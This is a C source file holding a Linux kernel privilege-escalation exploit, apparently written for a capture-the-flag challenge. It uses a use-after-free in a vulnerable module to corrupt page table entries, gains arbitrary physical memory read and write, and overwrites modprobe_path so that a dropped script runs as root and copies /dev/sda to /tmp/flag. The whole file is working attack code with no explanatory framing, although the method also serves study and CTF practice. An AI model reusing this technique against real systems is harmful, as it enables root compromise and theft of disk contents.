#include "libs/pwn.h"
#include <sys/sendfile.h>
#include <sched.h>
#include <sys/wait.h>

/*******************************
 * EXPLOIT                     *
 *******************************/

/*
 * inspired by https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#UAF-in-physical-memory
 */

#define PAYLOAD "#!/bin/sh\ncat /dev/sda > /tmp/flag"

// trigger modprobe
int win()
{
  int fd, count;

  fd = SYSCHK(open("/tmp/mp", O_RDWR | O_CREAT | O_TRUNC, S_IXUSR));
  SYSCHK(write(fd, PAYLOAD, strlen(PAYLOAD)));
  SYSCHK(close(fd));

  fd = SYSCHK(open("/tmp/ptr-yudai", O_RDWR | O_CREAT | O_TRUNC, S_IXUSR));
  CHK(write(fd, "\xff\xff\xff\xff", 4) == 4);
  SYSCHK(close(fd));

  // supposed to fail
  execlp("/tmp/ptr-yudai", NULL);

  fd = SYSCHK(open("/tmp/flag", O_RDONLY));
  count = SYSCHK(sendfile(STDOUT_FILENO, fd, NULL, 0x40));
  SYSCHK(close(fd));
  return count != 0;
}

#define N_SPRAY 0x400
#define PTE_SIZE 0x10000

int main(int argc, char* argv[]) {
  void *ptr;
  uint64_t pte;
  char leak[PTE_SIZE] = {0};
  char *spray[N_SPRAY];

  puts("[+] INIT");
  pin_cpu(0, 0);
  init();
  
  for (int i = 0; i < N_SPRAY; i++)
    spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000,
             PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);

  puts("[+] create dangeling ptr");
  ptr = keap_malloc(PTE_SIZE, GFP_KERNEL); 
  keap_write(ptr, leak, PTE_SIZE);
  keap_free(ptr);

  puts("[+] spray PTEs");
  for (int i = 0; i < N_SPRAY; i++)
    for (int j = 0; j < 8; j++)
      *(uint64_t*)(spray[i] + j*0x1000) = 0xdeadbeefcafebabe;

#ifdef DEBUG
  keap_read(ptr, leak, PTE_SIZE);
  print_hex(leak, 0x80);
#endif

  keap_read(ptr, &pte, 0x8);
  CHK((char)pte == 0x67);

  puts("[+] corrupt PTE using UAF with fixed physical address");
  // fixed physical address
  pte = 0x800000000009c067;
  keap_write(ptr, &pte, 0x8);

  puts("[+] find corrupted page");
  uint64_t *vuln = 0;
  uint64_t physbase = 0;
  for (int i = 0; i < N_SPRAY; i ++) {
    for (int j = 0; j < 8; j++) {
      if (*(uint64_t*)(spray[i]+j*0x1000) != 0xdeadbeefcafebabe) {
        vuln = (uint64_t*)(spray[i]+j*0x1000);
        physbase = (*vuln & ~0xfff);
        break;
      }
    }
    if (physbase)
      break;
  }

  CHK(physbase);

  printf("[+] physbase = 0x%lx\n", physbase);

  puts("[+] corrupt PTE into AAW/AAR");
  // find/g 0xffff888000000000, 0xffff888005000000, 0x6f6d2f6e6962732f
  uint64_t modprobe = 0x1eac000;
  // physbase with nokaslr + 0x3000
  uint64_t offset = 0x2401000 + 0x3000;

  pte = 0x8000000000000067|(physbase+modprobe-offset);

  keap_write(ptr, &pte, 0x8);

#ifdef DEBUG
  keap_read(ptr, leak, PTE_SIZE);
  print_hex(leak, 0x80);
#endif

  // reload pte or sth idk
  vuln = NULL;
  for (int i = 0; i < N_SPRAY; i ++) {
    for (int j = 0; j < 8; j++) {
      if (*(uint64_t*)(spray[i]+j*0x1000) != 0xdeadbeefcafebabe) {
        vuln = (uint64_t*)(spray[i]+j*0x1000);
        break;
      }
    }
    if (vuln)
      break;
  }

  puts("[+] finding modprobe_path offset");
  int off = -1;
  for(int i = 0; i < 0x200; ++i){
    if(vuln[i] == *(uint64_t*) "/sbin/modprobe") {
      off = i;
      break;
    }
  } 
  CHK(off != -1);

  printf("[+] found modprobe at offset = 0x%lx\n", off*8);
#ifdef DEBUG
  print_hex(&vuln[off], 0x40);
#endif

  puts("[+] overwriting modprobe_path");
  vuln[off] = *(uint64_t*) "/tmp/mp";

#ifdef DEBUG
  print_hex(vuln, 0x40);
#endif

  return win();  
}
